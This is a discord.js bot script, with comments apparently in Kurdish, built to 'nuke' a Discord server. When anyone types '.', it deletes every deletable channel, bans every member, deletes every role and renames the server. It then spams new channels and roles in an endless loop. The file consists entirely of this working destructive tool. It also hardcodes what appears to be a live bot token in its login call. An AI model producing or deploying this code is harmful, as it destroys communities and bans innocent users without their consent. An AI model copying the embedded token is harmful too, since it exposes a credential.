const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("PROGRESS HOME UP ");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("SALM Up", "text");///////bo channel 
        message.guild.createChannel("SALM Up", "voice");////bo voice
        message.guild.createRole({ name: "SALM Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTgyOTk5MzA3NTg0MTQzNDAw.GaAlFE.-3Tm_kbrcR_ylDHCMa8ztz55kzhpvTiqIsRtpk")
